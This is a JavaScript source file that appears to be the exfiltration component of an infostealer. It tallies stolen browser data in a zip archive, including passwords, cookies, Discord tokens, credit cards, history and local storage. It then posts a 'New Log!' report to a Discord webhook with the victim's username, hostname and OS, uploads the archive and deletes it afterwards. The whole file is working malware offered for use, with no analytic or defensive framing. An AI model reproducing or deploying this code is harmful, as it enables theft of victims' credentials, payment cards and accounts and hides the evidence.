const fs = require('fs');
const path = require('path');
const os = require('os');
const zlib = require('zlib');
const config = require('./config');

function formatBytes(bytes, decimals = 2) {
  if (!bytes || bytes === 0) return '0 Bytes';
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

function countFileContent(filename, content) {
  const baseName = path.basename(filename.replace(/\\/g, '/')).toLowerCase();

  if (baseName === 'konu.txt') {
    return null;
  }

  if (baseName.includes('cookie')) {
    const lines = content.split(/\r?\n/);
    return lines.filter(l => {
      const t = l.trim();
      return t.length > 0 && !t.startsWith('#') && t.includes('\t');
    }).length;
  }

  if (baseName.includes('token')) {
    const totalMatch = content.match(/Total valid tokens:\s*(\d+)/i);
    if (totalMatch) return parseInt(totalMatch[1], 10);
    const bracketMatches = content.match(/^\[.+\]/gm);
    if (bracketMatches) return bracketMatches.length;
    const lines = content.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0 && !l.startsWith('-') && !l.startsWith('|') && !l.startsWith('_'));
    return lines.length;
  }

  if (baseName.includes('pass')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^Pass:\s*/gim) || content.match(/^URL:\s*/gim) || []).length;
  }

  if (baseName.includes('card')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^Number:\s*/gim) || []).length;
  }

  if (baseName.includes('bookmark')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^Title:\s*/gim) || []).length;
  }

  if (baseName.includes('history')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^URL:\s*/gim) || []).length;
  }

  if (baseName.includes('download')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^Path:\s*/gim) || []).length;
  }

  if (baseName.includes('localstorage') || baseName.includes('local_storage')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^Key:\s*/gim) || []).length;
  }

  if (baseName.includes('extension')) {
    const sep = (content.match(/--------------------------------------------------/g) || []).length;
    if (sep > 0) return sep;
    return (content.match(/^Name:\s*/gim) || []).length;
  }

  const sep = (content.match(/--------------------------------------------------/g) || []).length;
  if (sep > 0) return sep;
  const lines = content.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0 && !l.startsWith('-') && !l.startsWith('|') && !l.startsWith('_') && !l.startsWith('/'));
  return lines.length;
}

function parseZipTxtEntries(buf) {
  const entries = {};
  if (!buf || buf.length < 22) return entries;

  let eocd = -1;
  for (let i = buf.length - 22; i >= 0; i--) {
    if (buf.readUInt32LE(i) === 0x06054b50) {
      eocd = i;
      break;
    }
  }
  if (eocd === -1) return entries;

  const count = buf.readUInt16LE(eocd + 10);
  let cur = buf.readUInt32LE(eocd + 16);

  for (let i = 0; i < count; i++) {
    if (cur >= buf.length || buf.readUInt32LE(cur) !== 0x02014b50) break;
    const method = buf.readUInt16LE(cur + 10);
    const compSize = buf.readUInt32LE(cur + 20);
    const fnLen = buf.readUInt16LE(cur + 28);
    const extraLen = buf.readUInt16LE(cur + 30);
    const commLen = buf.readUInt16LE(cur + 32);
    const localOff = buf.readUInt32LE(cur + 42);
    const fileName = buf.toString('utf8', cur + 46, cur + 46 + fnLen);

    if (fileName.toLowerCase().endsWith('.txt') && localOff < buf.length) {
      const lfnLen = buf.readUInt16LE(localOff + 26);
      const lextraLen = buf.readUInt16LE(localOff + 28);
      const dataOff = localOff + 30 + lfnLen + lextraLen;
      const comp = buf.subarray(dataOff, dataOff + compSize);
      let uncomp = null;

      if (method === 0) {
        uncomp = comp;
      } else if (method === 8) {
        try {
          uncomp = zlib.inflateRawSync(comp);
        } catch (_) { }
      }

      if (uncomp) {
        entries[fileName] = uncomp.toString('utf8');
      }
    }
    cur += 46 + fnLen + extraLen + commLen;
  }
  return entries;
}

function countTxtInDirectory(dirPath) {
  const entries = {};
  function traverse(current) {
    if (!fs.existsSync(current)) return;
    const items = fs.readdirSync(current, { withFileTypes: true });
    for (const item of items) {
      const fullPath = path.join(current, item.name);
      if (item.isDirectory()) {
        traverse(fullPath);
      } else if (item.isFile() && item.name.toLowerCase().endsWith('.txt')) {
        try {
          const content = fs.readFileSync(fullPath, 'utf8');
          entries[fullPath] = content;
        } catch (_) { }
      }
    }
  }
  traverse(dirPath);
  return entries;
}

function countAllLogs(target) {
  let txtMap = {};

  if (target) {
    if (Buffer.isBuffer(target)) {
      txtMap = parseZipTxtEntries(target);
    } else if (typeof target === 'string' && fs.existsSync(target)) {
      const stat = fs.statSync(target);
      if (stat.isDirectory()) {
        txtMap = countTxtInDirectory(target);
      } else if (stat.isFile()) {
        try {
          const buf = fs.readFileSync(target);
          txtMap = parseZipTxtEntries(buf);
        } catch (_) { }
      }
    }
  }

  const totals = {
    passwords: 0,
    cookies: 0,
    tokens: 0,
    cards: 0,
    history: 0,
    bookmarks: 0,
    downloads: 0,
    localStorage: 0,
    extensions: 0,
    others: {}
  };

  const details = [];

  for (const [filePath, content] of Object.entries(txtMap)) {
    const filename = path.basename(filePath.replace(/\\/g, '/'));
    const count = countFileContent(filename, content);
    if (count === null) continue;

    const lower = filename.toLowerCase();
    if (lower.includes('pass')) {
      totals.passwords += count;
    } else if (lower.includes('cookie')) {
      totals.cookies += count;
    } else if (lower.includes('token')) {
      totals.tokens += count;
    } else if (lower.includes('card')) {
      totals.cards += count;
    } else if (lower.includes('history')) {
      totals.history += count;
    } else if (lower.includes('bookmark')) {
      totals.bookmarks += count;
    } else if (lower.includes('download')) {
      totals.downloads += count;
    } else if (lower.includes('localstorage') || lower.includes('local_storage')) {
      totals.localStorage += count;
    } else if (lower.includes('extension')) {
      totals.extensions += count;
    } else {
      totals.others[filename] = (totals.others[filename] || 0) + count;
    }

    details.push({ file: filename, path: filePath, count });
  }

  const totalCount =
    totals.passwords +
    totals.cookies +
    totals.tokens +
    totals.cards +
    totals.history +
    totals.bookmarks +
    totals.downloads +
    totals.localStorage +
    totals.extensions +
    Object.values(totals.others).reduce((a, b) => a + b, 0);

  return { totals, details, totalCount };
}

function createComponentsV2Payload(fileInfo, extraDetails = {}) {
  const timestamp = new Date().toUTCString();
  const username = os.userInfo()?.username || 'Unknown';
  const hostname = os.hostname();
  const platform = `${os.platform()} (${os.arch()}) - ${os.release()}`;

  const logCounts = fileInfo.logCounts || extraDetails.logCounts || countAllLogs(fileInfo.targetZip || fileInfo.filePath);

  const statsLines = [
    `### Log Statistics (Total: ${logCounts.totalCount})`,
    `> **Passwords:** \`${logCounts.totals.passwords}\``,
    `> **Cookies:** \`${logCounts.totals.cookies}\``,
    `> **Discord Tokens:** \`${logCounts.totals.tokens}\``,
    `> **Cards:** \`${logCounts.totals.cards}\``,
  ];

  if (logCounts.totals.others && Object.keys(logCounts.totals.others).length > 0) {
    for (const [file, count] of Object.entries(logCounts.totals.others)) {
      statsLines.push(`> 📄 **${file}:** \`${count}\``);
    }
  }

  const payload = {
    flags: 32768,
    components: [
      {
        type: 17,
        components: [
          {
            type: 10,
            content: `## New Log!`
          },
          {
            type: 14,
            divider: true,
            spacing: 1
          },
          {
            type: 10,
            content: [
              `### Target Information`,
              `> **User:** \`${username}\``,
              `> **Hostname:** \`${hostname}\``,
              `> **OS:** \`${platform}\``,
            ].join('\n')
          },
          {
            type: 14,
            divider: true,
            spacing: 1
          },
          {
            type: 10,
            content: statsLines.join('\n')
          },
          {
            type: 14,
            divider: true,
            spacing: 1
          },
          {
            type: 13,
            file: {
              url: `attachment://${fileInfo.fileName}`
            }
          },
          {
            type: 14,
            divider: true,
            spacing: 1
          },
          {
            type: 10,
            content: `-# @konuprojectx`
          }
        ]
      }
    ]
  };

  const finalUsername = extraDetails.username || config.username;
  const finalAvatarUrl = extraDetails.avatarUrl || config.avatarUrl;

  if (finalUsername) payload.username = finalUsername;
  if (finalAvatarUrl) payload.avatar_url = finalAvatarUrl;

  return payload;
}

function findDefaultZip() {
  const tempDir = os.tmpdir();

  try {
    const tempFiles = fs.readdirSync(tempDir);
    const logZip = tempFiles.find(f => f.toLowerCase().endsWith('-all-logs.zip') || f.toLowerCase() === 'all-logs.zip');
    if (logZip) {
      return path.join(tempDir, logZip);
    }
  } catch (_) { }

  const searchPaths = [
    path.join(process.cwd(), 'all-logs.zip'),
    path.join(process.cwd(), 'output', 'all-logs.zip'),
    path.join(tempDir, 'all-logs.zip'),
    path.join(__dirname, '..', '..', 'all-logs.zip')
  ];

  for (const p of searchPaths) {
    if (fs.existsSync(p)) {
      return p;
    }
  }

  return null;
}

async function sendAllLogs(filePath, customOptions = {}) {
  const rawWebhookUrl = customOptions.webhookUrl || config.webhookUrl;
  const deleteAfterSend = customOptions.deleteAfterSend !== undefined ? customOptions.deleteAfterSend : true;
  let targetZip = filePath || findDefaultZip();

  if (!rawWebhookUrl || rawWebhookUrl === 'SUA_WEBHOOK_AQUI' || !rawWebhookUrl.startsWith('http')) {
    if (deleteAfterSend && targetZip) {
      try {
        if (fs.existsSync(targetZip)) {
          fs.unlinkSync(targetZip);
        }
      } catch (_) { }
    }
    return false;
  }

  if (!targetZip || !fs.existsSync(targetZip)) {
    return false;
  }

  const webhookUrl = rawWebhookUrl.includes('?')
    ? (rawWebhookUrl.includes('with_components=true') ? rawWebhookUrl : `${rawWebhookUrl}&with_components=true`)
    : `${rawWebhookUrl}?with_components=true`;

  const fileStats = fs.statSync(targetZip);
  const fileName = path.basename(targetZip);
  const fileBuffer = fs.readFileSync(targetZip);
  const logCounts = countAllLogs(fileBuffer);

  const fileInfo = {
    fileName,
    fileSizeBytes: fileStats.size,
    fileSizeFormatted: formatBytes(fileStats.size),
    targetZip,
    logCounts
  };

  const payload = createComponentsV2Payload(fileInfo, customOptions);

  const formData = new FormData();
  formData.append('payload_json', JSON.stringify(payload));

  const blob = new Blob([fileBuffer], { type: 'application/zip' });
  formData.append('files[0]', blob, fileName);

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      return false;
    }

    return true;
  } catch (_) {
    return false;
  } finally {
    if (deleteAfterSend) {
      try {
        if (fs.existsSync(targetZip)) {
          fs.unlinkSync(targetZip);
        }
      } catch (_) { }
    }
  }
}

if (require.main === module) {
  const args = process.argv.slice(2);
  const targetPath = args[0] || null;

  sendAllLogs(targetPath)
    .then(() => process.exit(0))
    .catch(() => process.exit(1));
}

module.exports = {
  sendAllLogs,
  createComponentsV2Payload,
  countAllLogs
};
